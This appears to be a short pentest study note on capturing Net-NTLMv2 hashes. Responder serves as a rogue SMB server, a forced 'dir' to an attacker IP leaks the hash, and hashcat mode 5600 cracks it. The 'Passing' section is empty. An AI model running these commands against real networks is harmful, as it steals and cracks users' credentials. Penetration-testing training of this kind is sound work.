# Net-NTLMv2

{% hint style="success" %}
When there is code execution as an unprivileged user&#x20;
{% endhint %}

1. set up an SMB server with Responder on our Kali machine
2. connect to it with the user
3. crack the Net-NTLMv2 hash, which is used in the authentication process.

<mark style="background-color:purple;">**Responder**</mark>:

* includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes
* also includes other protocol servers (including HTTP and FTP) as well as [_Link-Local Multicast Name Resolution_](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution) (LLMNR), [_NetBIOS Name Service_](https://en.wikipedia.org/wiki/NetBIOS) (NBT-NS), and [_Multicast\_DNS_](https://en.wikipedia.org/wiki/Multicast_DNS) (MDNS) poisoning capabilities

```sh
sudo responder -I tap0
```

* RES
* **-I**: listening interface

In shell, connecting to SMB server:

```sh
dir \\192.168.119.2\test
```



## Cracking Net-NLTMv2

Get correct hashcat mode:

```sh
hashcat --help | grep -i "ntlm"
```

Crack Net-NLTMv2 hash:

{% code overflow="wrap" %}
```sh
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
{% endcode %}



## Passing Net-NLTMv2
